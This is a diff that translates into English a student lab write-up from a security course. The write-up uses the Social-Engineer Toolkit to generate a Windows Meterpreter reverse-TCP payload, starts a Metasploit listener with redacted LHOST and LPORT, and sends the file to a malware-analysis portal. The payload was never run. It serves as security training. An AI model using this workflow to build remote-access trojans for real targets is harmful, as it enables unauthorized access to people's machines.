@@ -1,153 +1,122 @@
-# Atividade 2.1 — Criando um Trojan de Acesso Remoto com o Social-Engineer Toolkit
+# Activity 2.01 — Creating and Analyzing a Windows Remote-Access Payload with SET
 
-## Objetivo
+> **Program:** Hackers do Bem  
+> **Stage:** Fundamental — Module 02  
+> **Class:** 05–06  
+> **Environment:** Kali Linux virtual lab  
+> **Status:** Completed
 
-Explorar, em um ambiente controlado de laboratório, o funcionamento do **Social-Engineer Toolkit (SET)** para geração de um payload de acesso remoto para Windows e observar como esse arquivo é identificado por uma solução de análise de malware.
+## Objective
 
-A atividade teve como foco compreender o fluxo de criação de um payload, a configuração de um listener e a posterior análise do arquivo gerado em uma plataforma de Threat Intelligence.
+Explore the Social-Engineer Toolkit (SET) in a controlled laboratory environment to understand the generation of a Windows remote-access payload and observe how the resulting file is evaluated by a malware analysis platform.
 
-> **Aviso:** a atividade foi realizada exclusivamente para fins acadêmicos e em ambiente de laboratório. O payload não foi executado contra nenhuma máquina vítima.
+The activity focused on the payload-generation workflow, listener configuration, and subsequent analysis of the generated artifact using the Kaspersky Threat Intelligence Portal.
 
-## Ambiente
+> **Safety notice:** This activity was performed for educational purposes in a controlled lab environment. The generated payload was not executed on a victim machine, and no Meterpreter session was established.
 
-* Kali Linux
-* Terminal
-* Social-Engineer Toolkit (SET)
-* Metasploit Framework
-* Firefox
-* Kaspersky Threat Intelligence Portal
-* Ambiente virtualizado de laboratório
+## Environment
 
-## Procedimento
+- **Operating system:** Kali Linux
+- **Tools:** Social-Engineer Toolkit (SET), Metasploit Framework
+- **Browser:** Firefox
+- **Analysis platform:** Kaspersky Threat Intelligence Portal
+- **Execution environment:** Virtualized laboratory
 
-### 1. Acesso ao modo administrador
+## Procedure
 
-O Terminal foi aberto e o ambiente foi acessado com privilégios administrativos:
+### 1. Open an Administrative Shell
+
+The terminal was opened, and an administrative shell was started:
 
 ```bash
 sudo -i
 ```
 
-### 2. Inicialização do Social-Engineer Toolkit
+### 2. Launch the Social-Engineer Toolkit
 
-Em seguida, foi executado o SET:
+SET was launched using:
 
 ```bash
 setoolkit
 ```
 
-Na inicialização, os termos de uso foram apresentados e aceitos para prosseguir com a atividade.
+After startup, the tool displayed its terms of use, which were accepted to proceed with the exercise.
 
-A ferramenta apresentou o menu principal:
+The main menu included the following options:
 
 ```text
 Select from the menu:
 
-   1) Social-Engineering Attacks
-   2) Penetration Testing (Fast-Track)
-   3) Third Party Modules
-   4) Update the Social-Engineer Toolkit
-   5) Update SET configuration
-   6) Help, Credits, and About
-
-  99) Exit the Social-Engineer Toolkit
+1) Social-Engineering Attacks
+2) Penetration Testing (Fast-Track)
+3) Third Party Modules
+4) Update the Social-Engineer Toolkit
+5) Update SET configuration
+6) Help, Credits, and About
+99) Exit the Social-Engineer Toolkit
 ```
 
-Foi selecionada a opção:
+The following option was selected:
 
 ```text
 1) Social-Engineering Attacks
 ```
 
-### 3. Criação do payload e listener
+### 3. Select Payload and Listener Creation
 
-No menu de ataques de engenharia social, foi selecionada a opção responsável pela criação de payload e listener:
-
-```text
-Select from the menu:
-
-   1) Spear-Phishing Attack Vectors
-   2) Website Attack Vectors
-   3) Infectious Media Generator
-   4) Create a Payload and Listener
-   5) Mass Mailer Attack
-   6) Arduino-Based Attack Vector
-   7) Wireless Access Point Attack Vector
-   8) QRCode Generator Attack Vector
-   9) Powershell Attack Vectors
-  10) Third Party Modules
-
-  99) Return back to the main menu.
-
-set> 4
-```
-
-A opção `4` foi utilizada para acessar o processo de criação do payload.
-
-### 4. Seleção do tipo de payload
-
-Entre as opções disponíveis, foi selecionado o payload Windows x64 baseado em Meterpreter e comunicação reversa:
+Within the social-engineering menu, the payload-generation and listener option was selected:
 
 ```text
-   1) Windows Shell Reverse_TCP
-   2) Windows Reverse_TCP Meterpreter
-   3) Windows Reverse_TCP VNC DLL
-   4) Windows Shell Reverse_TCP X64
-   5) Windows Meterpreter Reverse_TCP X64
-   6) Windows Meterpreter Egress Buster
-   7) Windows Meterpreter Reverse HTTPS
-   8) Windows Meterpreter Reverse DNS
-   9) Download/Run your Own Executable
+4) Create a Payload and Listener
 ```
 
-Foi utilizada a opção:
+This opened the workflow used to generate the payload and configure its corresponding listener.
+
+### 4. Select the Payload Type
+
+The Windows x64 Meterpreter reverse TCP payload was selected from the available options:
 
 ```text
 5) Windows Meterpreter Reverse_TCP X64
 ```
 
-O objetivo dessa etapa foi demonstrar como o SET pode gerar um executável compatível com Windows utilizando um payload de conexão reversa.
+This option generates a Windows executable configured for a reverse TCP connection to a compatible listener.
 
-### 5. Geração do payload
+The activity used this selection to examine the payload-generation process in the laboratory.
 
-Após a seleção do payload, o SET solicitou os parâmetros necessários para a configuração do listener no ambiente de laboratório.
+### 5. Generate the Payload
 
-Após a definição dos parâmetros, a ferramenta iniciou a geração:
+SET requested the parameters required for the laboratory listener configuration.
+
+After the parameters were supplied, the tool reported that the payload had been generated and exported:
 
 ```text
 [*] Generating the payload.. please be patient.
 [*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
 ```
 
-O arquivo gerado foi:
+The generated file was:
 
 ```text
 payload.exe
 ```
 
-e ficou armazenado no diretório padrão utilizado pelo SET:
+Its original location was:
 
 ```text
 /root/.set/payload.exe
 ```
 
-### 6. Verificação do arquivo gerado
+### 6. Verify the Generated File
 
-Foi aberto um segundo Terminal para verificar se o executável havia sido criado corretamente.
-
-O diretório do SET foi acessado:
+A terminal was used to inspect the SET output directory:
 
 ```bash
 cd /root/.set/
-```
-
-Em seguida:
-
-```bash
 ls
 ```
 
-A saída observada foi semelhante a:
+The observed output included:
 
 ```text
 meta_config
@@ -156,30 +125,22 @@ set.options
 version.lock
 ```
 
-A presença do arquivo `payload.exe` confirmou que a etapa de geração havia sido concluída.
+The presence of `payload.exe` confirmed that the generation stage had completed.
 
-### 7. Inicialização do listener
+### 7. Observe Listener Initialization
 
-Após a geração do arquivo, o SET foi instruído a iniciar o listener.
+SET then launched the Metasploit Framework and initialized the `multi/handler` module.
 
-A ferramenta carregou o Metasploit Framework e configurou o módulo `multi/handler`:
+The relevant output included:
 
 ```text
 [*] Launching msfconsole, this could take a few to load. Be patient...
 
-       =[ metasploit v6.3.54-dev
-+ -- --=[ 2394 exploits - 1235 auxiliary - 422 post
-+ -- --=[ 1388 payloads - 46 encoders - 11 nops
-+ -- --=[ 9 evasion
-
-Metasploit Documentation: https://docs.metasploit.com/
-
 [*] Processing /root/.set/meta_config for ERB directives.
 resource (/root/.set/meta_config)> use multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
 resource (/root/.set/meta_config)> set payload windows/x64/meterpreter/reverse_tcp
-resource (/root/.set/meta_config)> set LHOST [configurado no laboratório]
-resource (/root/.set/meta_config)> set LPORT [porta configurada no laboratório]
+resource (/root/.set/meta_config)> set LHOST [configured in the lab]
+resource (/root/.set/meta_config)> set LPORT [configured in the lab]
 resource (/root/.set/meta_config)> set ExitOnSession false
 resource (/root/.set/meta_config)> exploit -j
 
@@ -187,165 +148,164 @@ resource (/root/.set/meta_config)> exploit -j
 [*] Exploit completed, but no session was created.
 
 [*] Started reverse TCP handler
-msf6 exploit(multi/handler) >
 ```
 
-O resultado indica que o listener foi iniciado, porém nenhuma sessão foi criada, pois o payload **não foi executado em uma máquina vítima**, conforme determinado pelo próprio laboratório.
+The listener started successfully and waited for an incoming connection. However, no session was created because the generated payload was not executed on a victim machine, as required by the laboratory procedure.
 
-### 8. Encerramento do listener
+### 8. Stop the Listener
 
-Como não seria realizada a execução do payload em uma máquina Windows, o listener foi encerrado após a demonstração.
+Since the payload would not be executed on a Windows target, the listener was stopped after the demonstration.
 
-O terminal utilizado pelo SET/Metasploit foi finalizado com:
+The terminal session was interrupted using:
 
 ```text
 Ctrl + C
 ```
 
-### 9. Preparação do arquivo para análise
+No Meterpreter session or remote shell was obtained during this activity.
 
-O arquivo `payload.exe` foi disponibilizado no diretório utilizado para a análise.
+### 9. Prepare the Artifact for Analysis
 
-A existência do arquivo foi novamente verificada antes do envio:
+The generated file was made available in the directory used for the analysis.
+
+The directory contents were checked before submitting the artifact:
 
 ```bash
 ls
 ```
 
-Resultado:
+The file was then used exclusively for security analysis.
 
-```text
-meta_config
-payload.exe
-set.options
-version.lock
-```
+### 10. Analyze the Artifact with Kaspersky Threat Intelligence Portal
 
-O arquivo foi então utilizado somente para análise de segurança.
+Firefox was opened, and the Kaspersky Threat Intelligence Portal was accessed.
 
-### 10. Análise no Kaspersky Threat Intelligence Portal
+The `payload.exe` file was submitted through the portal's file-analysis interface.
 
-O navegador Firefox foi aberto e acessado o **Kaspersky Threat Intelligence Portal**.
+After processing, the platform displayed its malware detection results. The observed detection count was greater than zero.
 
-O arquivo `payload.exe` foi enviado para análise através da opção de adição de arquivo.
+This result indicated that the generated artifact was recognized as malicious by the analysis service.
 
-Após o processamento, foram observadas as informações de detecção fornecidas pela plataforma.
+**Primary evidence:** the Kaspersky Threat Intelligence Portal analysis result for `payload.exe`.
 
-A análise apresentou **detecção de malware**, com valor de detecções superior a zero.
+> **Handling note:** Malware samples should only be submitted to analysis services when their terms and data-handling implications have been reviewed. Submitted files may be retained or shared according to the service's policies.
 
-Esse resultado confirma que o arquivo gerado pelo SET possui características reconhecidas como maliciosas pelas ferramentas de análise utilizadas pelo serviço.
+### 11. Remove the Analysis Copy
 
-> **Evidência principal da atividade:** resultado da análise do `payload.exe` no Kaspersky Threat Intelligence Portal.
+After the analysis, the copy of the file in the Documents directory was removed.
 
-### 11. Remoção do arquivo
-
-Após a análise, o arquivo utilizado no laboratório foi removido.
-
-O diretório de documentos foi acessado:
+The working directory was accessed:
 
 ```bash
 cd /home/aluno/Documentos/
 ```
 
-E o arquivo foi excluído:
+The file was deleted using:
 
 ```bash
 rm payload.exe
 ```
 
-A remoção foi realizada para evitar que o artefato permanecesse desnecessariamente no ambiente de laboratório.
+This removed the copy in the current directory. The command does not remove the original file from `/root/.set/`, so that location should be checked separately when cleaning up the laboratory.
 
-## Comandos utilizados
+## Commands Used
 
-Os principais comandos utilizados durante a atividade foram:
+The primary commands used during the activity were:
 
 ```bash
 sudo -i
 setoolkit
 ```
 
-Para verificar o payload gerado:
+To inspect the directory containing the generated payload:
 
 ```bash
 cd /root/.set/
 ls
 ```
 
-Para preparar o arquivo para análise:
+To prepare and remove the analysis copy:
 
 ```bash
 cd /home/aluno/Documentos/
-```
-
-E, ao final, remover o artefato:
-
-```bash
+ls
 rm payload.exe
 ```
 
-## Interpretação
+The listener configuration and artifact analysis were performed through the SET/Metasploit interfaces and the web browser.
 
-O laboratório demonstrou o fluxo básico de criação e análise de um **Remote Access Trojan (RAT)**.
+## Interpretation
 
-O SET automatizou a criação do payload e a configuração do listener, enquanto o Metasploit foi utilizado pelo processo para aguardar uma eventual conexão.
+This laboratory demonstrated the basic workflow for generating and analyzing a Windows remote-access payload.
 
-No entanto, o laboratório não realizou a etapa de execução do payload em uma máquina vítima. Dessa forma, não houve estabelecimento de sessão Meterpreter.
+SET automated payload generation and listener configuration, while Metasploit initialized a handler that awaited an incoming connection.
 
-O ponto principal da atividade foi a análise do artefato gerado. O Kaspersky Threat Intelligence Portal identificou o arquivo como malicioso, demonstrando que um payload criado para estabelecer acesso remoto pode ser detectado por mecanismos de análise e inteligência de ameaças.
+Because the generated payload was not executed on a target machine, no Meterpreter session was established. The practical outcome was therefore limited to generating the artifact, observing the listener initialization, and submitting the file for malware analysis.
 
-O fluxo observado pode ser representado de forma simplificada:
+The Kaspersky Threat Intelligence Portal reported malware detections for the generated artifact. This illustrated how a file designed to establish remote access can be recognized by a threat analysis service.
+
+The workflow can be summarized as follows:
 
 ```text
-SET
- │
- ├── Configuração do payload
- │
- ├── Geração do payload.exe
- │
- ├── Configuração do listener
- │
- └── Análise do artefato
-          │
-          ▼
+Social-Engineer Toolkit (SET)
+        |
+        v
+Payload Generation
+        |
+        v
+payload.exe
+        |
+        +------> Metasploit Listener Initialization
+        |                 |
+        |                 v
+        |          No Session Created
+        |
+        v
 Kaspersky Threat Intelligence Portal
-          │
-          ▼
-   Detecção de malware
+        |
+        v
+Malware Detection Results
 ```
 
-## Resultado
+## Result
 
-Foi possível:
+The activity demonstrated how to:
 
-* Inicializar o Social-Engineer Toolkit;
-* Explorar suas opções de engenharia social;
-* Criar um payload para Windows dentro do laboratório;
-* Confirmar a criação do arquivo `payload.exe`;
-* Observar a configuração do listener pelo Metasploit;
-* Verificar que nenhuma sessão foi criada, pois o payload não foi executado;
-* Submeter o artefato ao Kaspersky Threat Intelligence Portal;
-* Observar a detecção do arquivo como malware;
-* Remover o artefato após a análise.
+- Launch the Social-Engineer Toolkit.
+- Explore its social-engineering menu.
+- Generate a Windows x64 remote-access payload in the lab.
+- Verify that `payload.exe` was created.
+- Observe the listener configuration performed through Metasploit.
+- Confirm that no session was established because the payload was not executed.
+- Submit the artifact to the Kaspersky Threat Intelligence Portal.
+- Observe a malware detection result.
+- Remove the analysis copy from the working directory.
 
-A atividade permitiu relacionar a geração de um artefato malicioso com sua posterior identificação por uma ferramenta de Threat Intelligence.
+The exercise connected payload generation with defensive malware analysis, highlighting the importance of detecting and handling potentially malicious artifacts safely.
 
-## Conceitos praticados
+## Concepts Practiced
 
-* Social-Engineer Toolkit (SET)
-* Remote Access Trojan (RAT)
-* Malware
-* Payload
-* Meterpreter
-* Reverse TCP
-* Listener
-* Metasploit Framework
-* Threat Intelligence
-* Análise de malware
-* Detecção de artefatos maliciosos
-* Segurança em ambientes controlados
+- Social-Engineer Toolkit (SET)
+- Remote-access payloads
+- Malware artifacts
+- Meterpreter
+- Reverse TCP
+- Metasploit Framework
+- Listener initialization
+- Threat intelligence
+- Malware analysis
+- Detection of malicious artifacts
+- Safe handling of laboratory samples
+- Controlled security testing
 
-## Evidência
+## Evidence
 
-A execução da atividade foi registrada no PDF de evidências da Aula 05–06.
+The activity evidence is included in the PDF for Classes 05–06.
 
-[Ver evidências — Aula 05–06](https://github.com/Joaopmsitz/hackers-do-bem-labs/blob/main/fundamental/modulo-02/aula-05-06/evidencias.pdf)
+The relevant screenshots document payload generation, listener initialization, and the analysis result returned by the Kaspersky Threat Intelligence Portal.
+
+[View Evidence — Classes 05–06](../evidencias.pdf)
+
+---
+
+[Back to Classes 05–06](../) · [Back to Module 02](../../README.md) · [Back to Fundamental](../../../README.md) · [Back to Hackers do Bem](../../../../README.md)
